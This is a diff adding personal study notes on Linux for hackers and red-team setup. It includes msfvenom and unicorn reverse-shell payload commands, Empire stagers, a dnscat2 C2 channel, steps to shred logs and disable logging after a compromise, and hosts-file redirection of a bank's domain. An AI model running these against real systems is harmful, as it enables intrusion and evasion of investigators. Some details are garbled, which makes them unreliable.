@@ -1,0 +1,1626 @@
+binaries: - are executable files generally in /usr/bin/ or /usr/sbin with utilities such as ps, cat, ls, cd
+script: - series of commands run in an interpretive envt that converts each line to source code
+shell: - an envt & interpreter for running commnads in linux
+terminal: - command line interface
+/root: dir of all-powerful root user
+/etc: contains linux conf files
+/mnt: where file systems are attached or mounted
+/media: where external storage is mounted
+/bin: where binariesreside
+/lib: libraries
+pwd: present working dir
+whoami: checking logins
+cd: change dirs
+ls: listing contents
+ls -l: gets more info about contents
+ls -la: list even hidden files
+-h, --help: help about anything in linux eg nmap --help or nmap -h
+man: getting manual for a given cmd eg man nmap
+locate: finds stuff eg locate nmap
+whereis: finds binaries eg whereis nmap
+which: finds binaries in path variable eg which nmap
+find: most powerful & flexible of all search utilities eg find / -type f -name apache2
+ps: displays info about processes
+ps aux: all processes
+grep: filters a search eg ps aux | grep apache2
+cat filename: 
+cat > filename.txt: creates a new file with info
+cat >> filename.txt: appends info to the file
+touch new file without info
+mkdir: new dir
+cp: copying a file
+mv file1 file2: renames, moves file to another & deletes the old
+rmdir: removes a dir
+rmdir -r: removes dir with all its contents
+
+TEXT MANUPLATION IN LINUX
+- cat /etc/snort/snort.conf: but this is not the best cmd for viewing files rather the (head and tail) cmds
+- head: views the head content of a file eg head /etc/snort/snort.conf
+- tail: views the tail content of the file eg tail /etc/snort/snort.conf
+- head -20 /etc/snort/snort.conf and tail -20 /etc/snort/snort.conf views 20 head and tail lines
+- nl /etc/snort/snort.conf: shows the number of each line of content
+- grep: most widely used text manipulation cmd eg cat /etc/snort/snort.conf | grep output
+- tail -n+507 /etc/snort/snort.conf | head -n 6: shows lines from 507 to 512
+
+Usin SED to find and replace
+- sed: lets you find the occurrences of a word or text pattern and then perform some actions
+- cat /etc/snort/snort.conf | grep mysql: finds mysql using the grep cmd
+- Replacing the mysql (sed s/mysql(word to replace)/MySQL(word replaced)/g /etc/snort/snort.conf > snort2.conf(saved in new file))
+
+Viewing files using MORE and LESS
+- more /etc/snort/snort.conf
+- less /etc/snort/snort.conf
+
+
+ANALYZING AND MANAGING NETWORKS
+- ifconfig: views active network interfaces connected to a computer
+- iwconfig: views more info about the connected wireless network to be used by the hacking tools like aircrack-ng
+- the info collected includes the mode, adapter's IP, MAC address and we need to be in promiscuous mode for hacking
+
+Changing network information
+- ifconfig eth0(interface to change IP) 192.168.181.115(IP to change to)
+- infconfig eth0(int to change IP) 192.168.181.115(IP to chnge to) netmask 255.255.0.0(mask to chane to) broadcast 192.168.181.255(cast to change to)
+
+Spoofing your MAC address
+- ifconfig eth0 down (shutdown the interface)
+- ifconfig eth0 hw ether 00:11:22:33:44:55 (change the MAC)
+- ifconfig eth0 up
+
+Assigning new addresses using the DHCP server
+- Linux has a DHCP server that runs a daemon process in the bg called (dhcpd)
+- It gives IPs to all systems on the subnet and kips log files required by forensic analysits
+- Here, you first set a static IP for the DHCP server and then after set a 
+- dhclient eth0(interface to work with the IP)(sends DHCPDISCOVER 4m interface specified, then receives DHCPOFFER 4m DHCP server & confirms IP assignment
+
+Manuplating the DNS in Linux
+- dig is used to collect info about the domain target eg IPs
+- dig nelly.com(nameserver as the target) ns(nameserver)
+- dig nelly.com mx (mx helps you get info about the email servers used by the given domain)
+NB: BIND(Berkeley Internet Name Domain) is the DNS server for linux & linux users refer DNS to as BIND
+
+Changing the DNS server
+- This is always by making a change in the certain file
+- leafpad /etc/resolv.conf
+- add this (nameserver 8.8.8.8) or a domain you want to add
+- When you use a public domain for resolutions, it takes sometime & there4, you can use both the local and public in the file being edited
+
+Mapping your Own IP address
+- This helps yoiu determine which websites your IP goes to rather than leaving the work to the DNS
+- leafpad /etc/hosts
+- you can add any domain such as 192.168.181.131(IP in DHCP) press TAB bankofamerica.com(domain key) any web
+
+ADDING AND REMOVING SOFTWARE
+NB: Repositories are servers holding software for particular distributions of linux
+- when you install a package, all the files within it are installed together along with a script to make loading the softawre simpler
+- Here we can you 3 ways ie APT(Advanced Packaging Tool, GUI & git)
+- apt-cache search snort (searching if package is available from your repository)
+- apt-get install packagename (apt-get install snort) to install the package
+- apt-get remove packagename (apt-get remove snort) to remove any installed package
+NB: remove cmd does not remove the package conf files & you can always reinstall that package
+- apt-get purge snort (purge removes all the package and its conf files)
+- apt-get update (updates repositories)
+- apt-get upgrade (upgrades the software packages from the updated repositories)
+
+ADDING REPOSITORIES TO THE SOURCES.LIST FILE
+- Each distribution has its own repos and these repos may not work well with other distributions & by this, you can add other distribution repos to the sources.list file to search the package
+- leafpad /etc/apt/sources/list
+-  if it opens, you can add the following repositories or any other repo, of your choice in this file eg
+deb http://ppa.launchpad.net/webupd8team/java/ubuntu trusty main
+deb-src http://ppa.launchpad.net/webupd8team/java/ubuntu precise main
+
+USING GUI-BASED INSTALLER
+- Newer versions of Kali no longer include a GUI-based software tool that include the synaptic and Gdebi which can be installed through;
+- (apt-get install synaptic) or (apt-get install Gdebi)
+
+INSTALLING SOFTWARE WITH GIT
+- git clone https://www.github.com/balle/bluediving.git (clones bluediving)
+
+
+CONTROLLING FILE & DIRECTORY PERMISSIONS
+- chown bob /tmp/bobsfile (here, we give the cmd, the name of the user we are giving ownership to & then the location & name of the relevant file) & grants the user account for Bob ownership of bobsfile
+- chgrp security newIDS (passes the security group ownership of newIDS)
+- ls -l filepath (checks permissions on files)
+- chmod 774 hashcat.hcstat (passwes rwx to the given file)
+- chmod u+x, o+x hashcat.hcstat
+- chmod 766 newhackertool (execution permissions)
+- NB: 666 for files and 777 for directories
+
+SETTING MORE SECURE DEFAULT PERMISSIONS WITH MASKS
+- umask or unmask represents the permissions you want to remove from the base permissions on a file or directory so as to make them more secure
+- Its a 3-digit decimal number corrseponding to the 3 permissions
+- 666 or 777 can be -022 umask to result to 644 or 755
+- umask is preconfigured to 022 for kali (644 or 755)
+- umaks is not universal to all users on the system can each user can set their own value in .profile file
+- /home/username/.profile, you can add umask 007
+
+SPECIAL PERMISSIONS
+- in addition to rwx, linux has set user ID(SUID), group(SGUID) and sticky bit
+
+GRANTING TEMPORARY ROOT PERMISSIONS WITH SUID
+- SUID bit says that any user can execute the file with the permissions of the owner but those permissions don't extend beyond the use of that file
+- we add 4 to the rwx numerals to set SUID as (4644) but can't be done by a typical user rather can be done through
+- chmod 4644 filename
+
+GRANTING TEMPORARY ROOT PERMISSIONS WITH SGID
+- grants permission of the file owners group rather than the file's owner
+- chmod 2644
+
+STICKY BIT
+- A bit you can set on a directory to allow a user to delete or rename files within that directory
+- But its more used in older unix systems and ignored in the modern ones (linux)
+
+SPECIAL PERMISSIONS, PRIVILEGE ESCALATION & THE HACKER
+- in PE, a regular user gains root privileges & associated perms
+- One way for this is to exploit the SUID bit set by software devs on a prgm to allow it access to files with root perms eg /etc/shadow
+- (find / -user root -perm -4000) -> findings files with 4000 perms
+
+PROCESS MANAGEMENT
+- >ps (shows processes invoked by the currently logged in user & those running on the terminal)
+- >ps aux (shows all running on the sys for all users)
+- >ps axu | grep name(msconsole) (shows info for a particular process)
+- >top (shows processes ordered by resources used from the largest)
+- >nice -n -10 /bin/slowprocess (increments nice value by -10 so the process becomes more prioritized)
+- >renice 20 PID (process given a new NICE value)
+- >kill (kill signal) PID (kill terminates a process based on the signal you want the kernel to execute & these signals are 64)
+- >kill -1 PID (-1 is HUP kill signal)
+- >leafpad script.py & (& helps a process to run in the bg and the shell can prompt the same terminal for entry of a new cmd)
+- >fg PID (moves a process to the foreground)
+
+SCHEDULING PROCESSES
+- >at 7:20am
+- at> script to execute
+
+
+MANAGING USER ENVIRONMENT VARIABLES
+- Envt variables are variables built into your system & interface that control the way ur sys looks, acts & feels to the user & they're inherited by any child shells or processes & are always uppercase
+- Shell variables are typically listed in lowercase & are only valid in the shell they are set in.
+- These variables are key-value pairs (key=value, key=value1:value2)
+
+ENVT VARAIBLES
+- >env (shows all envt variables)
+- >set | more (shows all envt variables)
+- >set | grep HISTSIZE (filters variable of choice)
+- >HISTSIZE=0 (no history of cmds is stored on the system you are working with)
+- This changes the variables temporarily & if you want it to be permanent, we use the export cmd
+- >echo $HISTSIZE> ~/valueofHISTSIZE.txt (stores the original vlue of HISTSIZE)
+- >set>~/valueofALLon01012017.txt (contains the values to change to)
+- >export HISTSIZE (after setting the value, we export the value by this cmd)
+- >HISTSIZE=1000
+- >export HISTSIZE (permanently changes the value but does not save the original value)
+
+SHELL VARIABLES
+- \u (shows name of current user)
+- \h (shows host name)
+- \w (shows base name of current working directory)
+- >PS1="Worlds Best Hacker:# (changes the shell terminal to this sentence but only holds for only that terminal session)
+- >export PS1 (permanently changes the terminal to any string assigned for wvery new terminal)
+- >export PS1="C:\w>" (permanently changes terminal to look like that of windows)
+
+CHANGING YOUR PATH
+- >echo $PATH (finds which dirs are stored in ur PATH)
+- >PATH=$PATH:/root/newhackingtool (adds/appends this to ur PATH variable so as to access it anywhere to avoid nav to it all time you want it)
+- NB: adding many dirs to ur PATH vairable may slow down the sys coz it will navigate through many dirs
+
+CREATING CUSTOM USER DEFINED VARIABLE
+- >VARIABLE=" string or data for the variable "
+- >unset VARIABLE (deletes the variable with all its contents
+
+BASH SCRIPTING
+- bash shell cmds (:, ., bg, break, cd, continue, echo, eval, exec, exit, export, fg, getopts, jobs, pwd, read, readonly, set, shift, test, [, times, trap, type, umask, unset, wait)
+
+
+COMPRESSING AND ARCHIVING
+- Lossy compression reduces the size of files but the integrity of the files is lost there4 works best with graphics, video & audio files 
+- (.mp3, .mp4, .png, .jpg) are all lossy compression algorithms are as a small change in these is usally unoticeable
+- Lossless compression always maintains the integrity of files & its the one always used by hackers
+
+TARRING FILES TOGETHER
+- >tar -cvf archive.tar_name files to archive
+- c is for create, v lists the files tar is dealing with & f is for write to the file
+- >tar -tvf archive.tar_name (-t is for content listing of files in the archive)
+- >tar -xvf archive.tar_name (-x is for extracting the files from the archive, v shows the output of the files from the archive)
+- >tar -xf archive.tar_name ( does not show output of the files from the archived file)
+
+OTHER COMPRESSION METHODS
+- From combining your files into an archive, we then need to compress them using different methods
+
+- 1. compress with GNU zip (gzip archive_name.* to archive.tar.gz (* is for all files with that name no matter what extension))
+- uncompress with GNU unzip (gunzip archive.tar.gz)
+
+- 2. compress with bzip2 (bzip2 archive_name.tar) - gives smaller compression than gzip
+- uncompress with bunzip2 (bunzip2 archive_name.tar.bz2)
+
+- 3. compress with compress (compress archive_name.tar)
+- uncompress with uncompress (uncompress archive.tar.Z)
+
+CREATING BIT-BY-BIT OR PHYSICAL COPIES OF STORAGE DEVICES
+- dd cmd is used here to copy bit-by-bit copy of a file, filesystem or an entire hard drive
+- NB: dd cmd shd not be used in the day to day activities as its very slow
+
+- dd if=inputfile of=outputfile
+- eg >dd if=/dev/sdb of /root/flashcopy
+- kali >dd if=/dev/media of=/root/flashcopy bs=4096 conv:noerror (noerror continues to copy even errors & bs is the block size to copy which is 512 bytes by default bt can be changed
+ 
+FILESYSTEM & STORAGE DEVICE MANAGEMENT
+- mounting means attaching drives or disk to the filesystem to them accessible to the OS
+- the files for these devices are found in the /dev directory
+- >fdisk -l (lists all the partitions on the drive & their sizes)
+- >lsblk (lists all the block devices on your system)
+
+UMOUNTING OR MOUNTING A STORAGE DEVICE YURSELF
+- >mount /dev/sbd1 /mnt (mounts a hard drive)
+- >mount /dev/sbdc1 /media (mount external storage devices in the media dir)
+- >umount /dev/sbd1
+
+MONITORING THE FILESYSTEM
+- >df (gets file system info on mounted default hard drive)
+- >df drive_representation (gets filesystem info any other drives mounted on your system)
+- >fsck (filesystem check)(checks for errors & repairs for any error if possible)
+- NB: But to check & fix errors, you need to 1st unmount the disk 
+- >umount drive/disk-path eg (/media/mivule/flash-disk)
+- >fsck -p drive/disk-path for the disk umounted eg (/media/mivule/flash-disk)
+
+THE LOGGING SYSTEM
+- Linux uses a daemon called SYSLOGD to automatically log events on your computer 
+- Several variations of SYSLOG include RSYSLOG & SYSLOG-NG on different linux variations
+- But Debian uses RSYSLOG
+- >locate rsyslog (locates all files related to rsyslog)
+- NB: rsyslog.conf is managed & configured by a plaintext editor like mousepad
+- >leafpad /etc/rsyslog.conf
+- facility.priority action
+- Facility keyword references the program such mail, kernel or lpr whose messages are being logged
+- Priority keyword determines what kind of messages to log for that program
+- Action keyword references the location where the log will be sent
+
+LIST OF VALID CODES UNDER FACILITY
+- auth/authpriv Security/authorization messages
+- cron Clock daemons
+- daemon Other daemons
+- kern Kernel messages
+- lpr Printing system
+- mail Mail system
+- user Generic user-level messages
+
+LIST OF VALID CODES UNDER PRIORITY
+- debug, info, notice, warning, warn, error, err, crit, alert, emerg, panic
+- But warning, warn, error, err, emerg & panic have all been deprecated & shd not be used 
+
+IN THE ACTIONS
+- >mail.* /var/log/mail
+- >kern.crit /var/log/kernel
+- >*.emerg*
+
+AUTOMATICALLY CLEANING UP LOGS WITH LOGROTATE
+- Log files take up space & so if you don not clean them up, they can fill up your entire hard drive
+- BUT if you frequently delete them, you will not have log files for reference at some future point in time
+- You can use logrotate to determine the balance btn these opposing requirements by rotating your logs
+- LOG ROTATION is the process of regularly archiving log files by moving them to some other location & that location will get cleaned up at a specified period of time
+- Your system is already rotating log files using a CRON job that employs the LOGROTATE of your log rotation with the /etc/logrotate.conf text file
+
+- >leafpad /etc/logrotate.conf
+
+- For every log saved, the logs are saved in number incrementally eg /var/log/auth.log.1, auth.log.2, auth.log.3
+
+REMAININGN STEALTHY
+
+1. REMOVING EVIDENCE
+- Once you've compromised a Linux system, it's useful to disabel logging & remove any of your intrusion in the log files to reduce the chances of detection
+- When deleting your logs, you use the normal deleting methods of linux but they're time consuming & a forensic expert can recover them
+- BUT linux provides SHRED to remove log files
+- >shred --help
+- Shred will delete the file & overwrite it several times & by default its 4 times
+- >shred -f -n 10 /var/log/auth.log.* (-f allows overwriting, -n the of times to overwrite)
+- NB: The more a file is overwritten, the more its difficulty to recover bt more times take time so choose wisely
+
+2. DISABLING LOGGING
+- This however needs root previleges & follows the syntax service service_name start|stop|restart eg
+- >service rsyslog stop
+- Here the logging is stopped until you restart it again
+
+
+USING & ABUSING SERVICES
+- A service is an application that runs in the bg waiting for you to use it
+
+STARTING, STOPPING & RESTARTING SERVICES
+- >services service_name start|stop|restart eg
+- >services Apache2 start|stop|restart
+
+CREATING AN HTTP WEB SERVER WITH APACHE WEB SERVER
+- >sudo apt-get install apache2 (if you happen not to have it on your system)
+- Apache web server is mostly associated with the MySQL database
+- >services apache2 start
+
+OPENSSH & THE RASPBERRY SPY PI
+- SSH is Secure Shell that enables us to connect securely to a terminal on remote system a replacement of telnet
+- In a web server, SSH enables us to create an access list, authenticate users with encrypted password & encrypt all communication
+- This reduces the chance of unwanted users using the terminal or intercepting our communication
+- OpenSSH is the widely used Linux SSH
+- >service ssh start (starts the SSH)
+
+- Make sure that your Raspberry Pi is running the Raspbian os which is also a Linux distribution ported for Raspberry Pi CPU
+- Get guide here how to set your Raspberry Pi (https://www.raspberrypi.org/learning/hardware­guide/)
+- Attach your camera module on the board of Raspberry Pi properly but know that its fragile & careful installation is needed
+- The Raspberry is connected to the network through a Network cable or W"I-FI
+- Use (ifconfig) to get its IP address
+- Connect to the Raspberry Pi using the obtained IP address from your kali system
+- >ssh pi@IP_address
+- pi>sudo raspi-config (this is used to access the GUI of the Raspberry Pi & enable the camera module)
+- reboot the Pi to enable the settings
+- After restarting the Raspberry Pi, 
+- pi@raspberrypi:raspistill (to help us take pictures)
+- pi@raspberrypi:raspistill -v -o picture_name.jpg
+- pi@raspberrypi:ls -l 
+
+EXTRACTING INFORMATION FROM MYSQL
+- >service mysql start (starts MySQL database)
+- >mysql -u root -p (cmd to log into the mysql bd)
+- mysql>select user, host, password from mysql.user (shows all the users of the MySQL db)
+- mysql>show databases;
+- mysql>use database_name;
+- >mysql -u <username> -p (used to access MySQL db on the localhost)
+- >mysql -u root -p IP_address (connects to a remote MySQL db on the given IP_address)
+- mysql>show databases; (shows mysql dbs on the connected mysql db)
+- mysql>use db_name; (chooses a db to be used)
+- mysql>show tables; (shows tables in the chosen db)
+- mysql>describe table_name; (shows info about the table columns)
+- mysql>SELECT * FROM column_name; (shows all the info in the column)
+
+POSTGRESQL WITH METASPLOIT
+- >sudo apt-get postgres install
+- >service postgresql start
+- >msfconsole (starts metasploit & then prompts a console)
+- msf>msfdb init (a cmd to store metasploit data into the postgresql database)
+- msf>su postgres (log in to postgres as root)
+- postgres@kali>/root$ createuser msf_user -P (we create a user and then enter a password for the user)
+- postgres@kali>/root$ createdb --owner=msf_user hackers_rise_db (create the database as hackers_rise_db & grant permissions)
+- postgres@kali>/root$ exit (thi will take you back to the msf console)
+- msf>db_connect msf_user:password@127.0.0.1/hackers_rise_db (connect to the postgress db created)
+- msf>db_status (check status of the database)
+
+BECOMING SECURE & ANONYMOUS
+- All the activities you do on the internet is always tracked & a hacker shd be sure how to their activities
+- Hiding the navigation is through the (Onion Network, Proxy servers, Virtual Private Network & Password encrypted email)
+- But these can not give complete protection but can give gathering a difficulty time
+
+- >traceroute google.com (traces all paths your packet took from the source to destination)
+
+THE ONION ROUTER SYSTEM
+- Here, you are connected to a network of over 7000 routers and when a packet is sent, the packet is encrypted before reaching the next hop
+and there after sent to the next hop which decrypts it and thereafter encrypts it to the next hop & so the interceptor can not know the origin of the packet.
+- This is network is not so secure because the NASA is all possible ways to break this network & there4 your packet may fall in the NASA's TOR newtork which will always know the packet destination
+
+PROXY SERVERS
+- These act as middlemen systems for traffic where a user connects to it & their traffic is given an IP address before its passed on
+- By all this, the traffic appears to be from the proxy for both the source & destination
+- But this proxy keeps the IP logs where an investigator will have to get a warrant to check your system
+- You can also use more than one proxy to increase the anonymity in a strategy called proxy chain
+- Kali has its own proxychains & can be set as following some of the cmds below
+- >proxychains <the command you want proxied> <argument> (eg.....)
+- >proxychains nmap -sT - Pn <IP address>
+- >leafpad /etc/proxychains.conf (you can add proxy names, ports & IP addresses at the proxylist section)
+- http://www.hidemy.name (this can help you get free proxies you can use)
+- But by default, proxychains in kali uses TOR if you do not enter proxies of your choice
+- >proxychains firefox www.hackers-arise.com (testing your proxy)
+
+- In the proxychain.conf file, you have to uncomment the dynamic_chain & strict_chain sections 
+- Dynamic chaining allows your packet to go through the different proxies you have set & failure of one will not affect the chain
+
+- Dynamic random chain can also be used to set the number of proxies for each chain by uncommenting random_chain & chain_len
+- But dynamic_chain & random_chain can not be used at the same time, they are used one at a time
+- Set the chain_len=number_of_ips(3)
+
+- NB: proxychains are as good as the proxies you use because free proxies sell IP addresses & browsing data
+
+VIRTUAL PRIVATE NETWORKS (VPN)
+- VPNs mask your IP by encrypting your data & then send it using a different IP rather than your own IP address
+- Some commercial trustable VPNs include (IPVanish, NordVPN, ExpressVPN, CyberGhost, Golden Frog, Hide My Ass, Private Internet Access, PureVPN, TorGuard, Buffered VPN
+- The weakness of VPNs is that, the owners have your IP data & so if compromised, you can be compromised too
+
+NB: IF a service if free, youre the product not the customer
+
+ENCRYPTED EMAIL
+- Gmail, Yahoo! & Outlook Web Mail are free email service & so you are the customer
+- To allow anonymity, you can use ProtonMail that encrypts all you info
+
+
+UNDERSTANDING & INSPECTING WIRELESS NETWORKS
+- AP (Access Point where devices connect to)
+- ESSID (Extended service set identifier) same as SSID used for multiple APs in a wireless LAN
+- SSID (Service set identifier) is the name of the network
+- Power is the closeness to the network
+
+- >ifconfig (shows networks connected to your system)
+- >iwconfig (shows wireless interfaces)
+
+- IF not sure of the AP to connect to, use the iwlist command followed different actions
+- >iwlist wlan0 scan
+- >nmcli dev wifi (shows the Wi-Fi APs near you & their key data)
+- >nmcli dev wifi connect AP_nam password ***** (connects to an AP if you know the password)
+
+- >airmon-ng start|stop|restart inerface
+- >airodump-ng interface (captures & displays the key data from broadcasting APs & any client connected to those APs)
+
+SCANNING & CONNECTING TO BLUETOOTH
+- >apt-get install bluez
+- >hciconfig (checks whether the bluetooth adapter on the sys we're using is recognized & enabled so we can use it to scan for other devices)
+- >hciconfig hci0 up (starts the adapter hci0)
+- >hcitool scan (scans for othe bt devices)
+- >hcitool inq (gathers more about the available devices)
+- >sdptool browse MACaddress (scans bt one of the devices detected)
+- >sdptool browse 76:6E:46:63:72:66 
+- >l2ping MACaddress (sends a ping to the any devices gathered)
+- >l2ping 76:6E:46:72:66 -c 4
+
+MANAGING LINUX LOADABLE KERNEL & LOADABLE KERNEL MODULES
+- >umane -a (checks the kernel version in terminal)
+- >cat /prov/version
+- >sysctl -a | less (be careful when using this cmd as it may make ur system unbootable & unusable)
+- net.ipv4.ip_forward=0 (is the kernel parameter to enable it forward on the packets it receives & with 0 its disabled)
+- >sysctl -w net.ipv4.ip_forward=1 (enables forwarding)
+
+NB: changes in the terminal exist as long as the system is up but go back to default when the system is switched off
+and so, to make permanent changes, you edit the file /etc/sysctl.conf using a text editor
+
+- >lsmod (lists the installed in the kernel)
+- >modinfo module_name (finds more info about the module)
+
+- >modprobe -a <module name or module you want to add to the kernel> (adding a module to the kernel)
+- >modprobe -r <module to remove> (removes a module from the kernel)
+- >dmesg | grep video (check for successful installation of the module in the kernel by printing out the message buffer from the kernel)
+
+NB: Since linux uses a monolithic kernel, it allows adding and removing modules from the kernel in a term called LKMs(Loadable Kernel Modules)
+
+
+AUTOMATING TASKS WITH JOB SCHEDULING
+- The jobs to be scheduled are entered into the /etc/crontab file
+
+
+
+PRACTICAL PENETRATION TESTING
+- Common vulnerabilities in cyber security
+1. Abusing Active Directory
+2. Abusing Kerberos
+3. Advanced Web Attacks
+4. Better Ways to Move Laterally
+5. Cloud Vulnerabilities
+6. Faster/Smarter Password Cracking
+7. Living Off the Land
+8. Lateral Movement Attacks
+9. Multiple Custom Labs
+10. Newer Web Language Vulnerabilities
+11. Physical Attacks
+12. Privilege Escalation
+13. PowerShell Attacks
+14. Ransomware Attacks
+15. Red Team vs Penetration Testing
+16. Setting Up Your Red Team Infrastructure
+17. Usable Red Team Metrics
+18. Writing Malware and Evading AV
+
+PTES: http://www.pentest-standard.org
+http://bit.ly/2H0MTZA
+
+- Red team campaigns heavily differ from penetration test coz Red Teamers focus on detection/mitigation instead of vulnerabilities
+
+
+SETTING UP YOUR EXTERNAL SERVERS
+- Digital Ocean Droplets (https://www.digitalocean.com/products/compute) or Amazon Web Services (AWS) Lightsail servers (https://lightsail.aws.amazon.com)
+are some of the cheap or free Virtual Private Servers
+- Read the terms for the server providers not to fall in troublr (https://aws.amazon.com/service-terms/)
+
+settings
+- https://lightsail.aws.amazon.com/
+- Create an Instance (atleast 1 GB of RAM storage space usually isn't an isssue)
+- Linux/Unix
+- OS Only->Ubuntu
+- Download Cert
+- chmod 600 cert
+- ssh -i cert ubuntu@[ip]
+NB: 
+> Its better to develop own IPTables rules, SSL certs, tools, scripts and more for yourself
+> The git clone below has most of the tools we can use in our Red Teaming
+> Set up strong IPTables since this will be your attack server, you will limit where SSH auths can initiate from, where Empire/Meterpreter/Cobalt Strike payloads can come from, 
+and any phishing pages you stand up.
+
+- sudo su -
+- apt-get update
+- apt-get install python
+- git clone https://github.com/trustedsec/ptf /opt/ptf
+- cd /opt/ptf && ./ptf
+- use modules/exploitation/install_update_all
+- use modules/intelligence-gathering/install_update_all
+- use modules/post-exploitation/install_update_all
+- use modules/powershell/install_update_all
+- use modules/vulnerability-analysis/install_update_all
+- cd /pentest
+
+- The best part of using Lightsail is that once you have your machine configured to your preferences, you can take a snapshot of a machine
+and stand up multiple, brand new instances of that image.
+- Red Baron is a set of modules and custom/third-party providers for Terraform that tries to automate the creation of resilient, disposable, secure & agile infrastructure
+for Red Teams (https://github.com/Coalfire-Research/Red-Baron) and it can help you build your own infrastructure
+
+- For Red Team engagements, we might use Metasploit to compromise internal systems
+with the MS17-010 Eternal Blue Exploit (http://bit.ly/2H2PTsI) to get our first shell or
+we might use Metasploit to generate a Meterpreter payload for our social engineering
+attack.
+
+Obfuscating Meterpreter Payloads, we might use a Word or Excel doc as our delivery mechnism
+- >msfvenom --payload windows/x64/meterpreter_reverse_http --format psh --out meterpreter-64.ps1 LHOST=127.0.0.1
+- >/apt/unicorn>python unicorn.py windows/meterpreter/reverse_https 10.100.100.2 443
+- this cmd helps us to use the powershell
+
+
+COBALT STRIKE 
+- a tool for post exploitation. lateral movement, staying hidden in network, exfiltration for Red Team simulation
+- Cobalt Strike doesn't really have exploits and isn't used for compromising a system via the newest 0-day vulnerability.
+- Once you can execute a Cobalt Strike payload, it creates a Beacon connection back to the Command and Control server.
+- Domain Fronting is a collection of techniques to make use of other people’s domains and infrastructures as redirectors for your controller ((http://bit.ly/2GYw55A)
+- great resources on different products that support Domain Fronting (http://bit.ly/2HjM3eH, http://bit.ly/2Hn7RW4, https://bitrot.sh/post/30-11-2017-domain-
+fronting-with-meterpreter/.)
+
+
+- In terms of operational security, we don’t want to build a campaign that can be taken out easily.
+- As a Red Teamer, we have to assumethat some of our agents will be discovered by the Blue Team.
+- If we have all of our hosts talking to one or two C2 endpoints, it would be pretty easy to take out our entire infrastructure.
+- Cobalt Strike supports SMB Beacons between hosts for C2 communication.
+- This allows you to have one compromised machine communicate to the internet, and all other machines on the network to communicate through the
+initial compromised host over SMB (https://www.cobaltstrike.com/help-smb-beacon)
+- This way, if one of the secondary systems is detected and forensics analysis is performed, they might not be able to identify the C2 domain associated with the attack.
+- A neat feature of Cobalt Strike that immensely helps Red Teams is its ability to manipulate how your Beacons communicate.
+- Using Malleable C2 Profiles, you can have all your traffic from your compromised systems look like normal traffic.
+- What if we can make our C2 communication look like normal web traffic? This is where Malleable C2 Profiles come into play. Take a look at this example: 
+https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/amazon.profile.
+
+POWERSHELL EMPIRE
+- Empire is a post-exploitation framework that includes a pure-PowerShell2.0 Windows agent, and a pure Python 2.6/2.7 Linux/OS X agent.
+- On the PowerShell side, Empire implements the ability to run PowerShell agents without needing powershell.exe, rapidly deployable post-exploitation modules ranging from key
+loggers to Mimikatz, and adaptable communications to evade network detection, all wrapped up in usability-focused framework
+[https://github.com/EmpireProject/Empire].
+
+- Set the CertPath to a real trusted SSL certificate.
+- Change the DefaultProfile endpoints. Many layer 7 firewalls look for the exact static endpoints.
+- Change the User Agent used to communicate.
+- Starting up Empire (cd /opt/Empire && ./setup/reset.sh)
+- Exit (exit)
+- Setup Up Cert (best practice is to use real trusted certs) (./setup/cert.sh)
+- Start Empire (./empire)
+- Start a Listener (listeners)
+- Pick your listener (we'll use http for our labs) (uselistener [tab twice to see all listener types], uselistener http)
+- View all configurations for the listener (info)
+- Set the following (i.e. set KillDate 12/12/2020):
+- > KillDate - The end of your campaign so your agents autocleanup
+- >DefaultProfile - Make sure to change all the endpoints (i.e. /admin/get.php,/news.php). You can make them up however you want, such as /seriously/notmalware.php
+- >DefaultProfile - Make sure to also change your User Agent. I like to look at the top User Agents used and pick one of those.
+- >Host - Change to HTTPS and over port 443
+- >CertPath - Add your path to your SSL Certificates
+- >UserAgent - Change this to your common User Agent
+- >Port - Set to 443
+- >ServerVersion - Change this to another common Server Header
+- When you are all done, start your listener (execute)
+
+- The payload is the actual malware that will run on the victim's system. These payloads can run in Windows, Linux, and OSX, but Empire is most well-known for its PowerShell Windows Payloads:
+- Go to the Main menu (main)
+- Create stager available for OSX, Windows, Linux. We are going to create a simple batfile as an example, but you can create macros for Office files or payloads for a rubber ducky
+(usestager [tab twice to see all the different types], usestager windows/launcher_bat)
+- Look at all settings (info)
+- Configure All Settings (set Listener http, Configure the UserAgent)
+- Create Payload (generate)
+- Review your payload in another terminal window (cat /tmp/launcher.bat)
+
+- If you don't already have PowerShell installed on your Kali image, the best way to do so is to install it manually. Installing PowerShell on Kali:
+- >apt-get install libunwind8
+- >wget http://security.debian.org/debian-security/pool/updates/main/o/openssl/libssl1.0.0_1.0.1t-1+deb7u3_amd64.deb
+- >dpkg -i libssl1.0.0_1.0.1t-1+deb7u3_amd64.deb
+- >wget http://security.ubuntu.com/ubuntu/pool/main/i/icu/libicu55_55.1-7ubuntu0.3_amd64.deb
+- >dpkg -i libicu55_55.1-7ubuntu0.3_amd64.deb
+- >wget https://github.com/PowerShell/PowerShell/releases/download/v6.0.2/powershell_6.0.dpkg -i powershell_6.0.2-1.ubuntu.16.04_amd64.deb
+- >dpkg -i powershell_6.0.2-1.ubuntu.16.04_amd64.deb
+
+
+DNSCAT2
+- This tool is designed to create an encrypted Command and Control (C2) channel over the DNS protocol, which is an effective tunnel out of almost every network
+[https://github.com/iagox86/dnscat2].
+- C2 and exfiltration over DNS provides a great mechanism to hide your traffic, evade network sensors, and get around network restrictions.
+
+Setting Up an Authoritative DNS Server using GoDaddy
+- First, make sure to set up a VPS server to be your C2 attacking server and getthe IP of that server
+- Log into your GoDaddy (or similar) account after purchasing a domain
+- Select your domain, click manage, and select Advanced DNS
+- Next, set up Hostnames in the DNS Management to point to your Server (ns1 (and put the IP of your VPS server), ns2 (and put the IP of your VPS server))
+- Edit Nameservers to Custom (Add ns1.loca1host.com, Add ns2.loca1host.com)
+
+Next, we are going to need to fully set up our attacker server that is acting as our nameserver. Setting up the dnscat2 Server:
+- >sudo su -
+- >apt-get update
+- >apt-get install ruby-dev
+- >git clone https://github.com/iagox86/dnscat2.git
+- >cd dnscat2/server/
+- >apt-get install gcc make
+- >gem install bundler
+- >bundle install
+- Test to make sure it works: ruby ./dnscat2.rb
+- Quick Note: If you are using Amazon Lightsail, make sure to allow UDP port 53
+
+For the client code, we will need to compile it to make a binary for a Linux payload.
+Compiling the Client
+- >git clone https://github.com/iagox86/dnscat2.git /opt/dnscat2/client
+- >cd /opt/dnscat2/client/
+- >make
+- We should now have a dnscat binary created!
+- (If in Windows: Load client/win32/dnscat2.vcproj into Visual Studio and hit"build")
+
+
+To start the dncat2 on your attacker server:
+- screen
